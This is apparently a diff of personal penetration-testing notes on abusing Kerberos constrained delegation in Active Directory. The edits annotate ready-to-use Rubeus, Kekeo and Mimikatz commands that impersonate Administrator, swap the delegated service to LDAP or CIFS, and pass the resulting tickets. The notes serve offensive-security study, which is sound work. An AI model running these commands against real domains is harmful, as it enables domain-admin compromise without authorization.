@@ -322,8 +322,8 @@ PetitPotam.exe appserver-hostname dchostname  //do that on studentmachine
   * Service for User to Proxy (S4U2proxy) - Allows a service to obtain a TGS to a second service on behalf of a user. Which second service? This is controlled by msDS-AllowedToDelegateTo attribute of the service account. This attribute contains a list of SPNs to which the user tokens can be forwarded.
 * ❗ **Problem 1**: If you can compromise the user account mentioned in Get-DomainUser -TrustedToAuth, you can access the service mentioned in msds-allowedtodleegateto as ANY user, including DA.
 * ❗**Problem 2**: The SPN part is not encrypted (Get-DomainUser -TrustedToAuth - msds-allowedtodelegateto attribute) - so you can change this service!\
-  So you can access all services on the target machine which us the same service account!!\
-  ❗=> check all other services http, cifs, host etc. when you only have like time service
+  So you can access all services on the target machine which us the same service account!\
+  ❗=> check all other services http (PSRemoting), cifs, host (schedule task then) etc. when you only have like time service
 * ❗ No Request/Connection from DA to the Host is required!
 * Delegation not only occurs for the specified service but for any service running under the same account. There is no validation for the SPN specified.\
   This is huge as it allows to many interesting services when the delegation may be for a non-intrusive service!\
@@ -362,7 +362,7 @@ Get-ADObject -filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-All
 
 {% code overflow="wrap" %}
 ```
-rubeus.exe s4u /user:username-with-constrained-delegation-enabled-user-or-machine-acc /aes256:hash /impersonateuser:Administrator /msdsspn:CIFS/dc.dom.loacl /ptt
+rubeus.exe s4u /user:username-with-constrained-delegation-enabled-user-or-machine-acc /aes256:hash-of-user /impersonateuser:Administrator /msdsspn:CIFS/dc.dom.loacl(asShownInGet-DomainUser) /ptt
 ```
 {% endcode %}
 
@@ -390,19 +390,16 @@ Invoke-Mimikatz -command '"kerberos::ptt filename_to_tgs_from_kekeo.kirbi"'
 ls \\host.dom.local\c$
 ```
 
-**Problem 2: Machine Account$ is used - If delegation is for non intrusive service but done with e.g Administrator, everything else with that user can be abused.**
+**❗Problem 2: Machine Account$ is used - If delegation is for non intrusive service but done with e.g Administrator, everything else with that user can be abused.**
 
-{% code overflow="wrap" %}
-```powershell
-tgt::ask /user:usernae$ /domain:dom.local /rc4:rc4here
-
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>tgt::ask /user:usernae$ /domain:dom.local /rc4:rc4here
+</strong>
 tgs::s4u /tgt:filename.kirbi /user:Administrator@dom.local /service:time/dom.local|ldap/dom.local
 => We also request LDAP Access as Administrator, which runs under the same service account as the regular time service
 
 Same with rubeus in one command:
-Rubeus.exe s4u /user:machine-account-with-CD$ /aes256:.... /impersonateuser:Administrator /msdsspn:time/dom.local(what is shown in  Get-DomainComputer -TrustedToAuth)  /altservice:ldap /ptt
-```
-{% endcode %}
+Rubeus.exe s4u /user:machine-account-with-CD$ /aes256:machine-account-hash /impersonateuser:Administrator /msdsspn:time/dom.local(what is shown in  Get-DomainComputer -TrustedToAuth)  /altservice:ldap /ptt
+</code></pre>
 
 ```
 Invoke-Mimikatz -command '"kerberos::ptt filename.kirbi"'
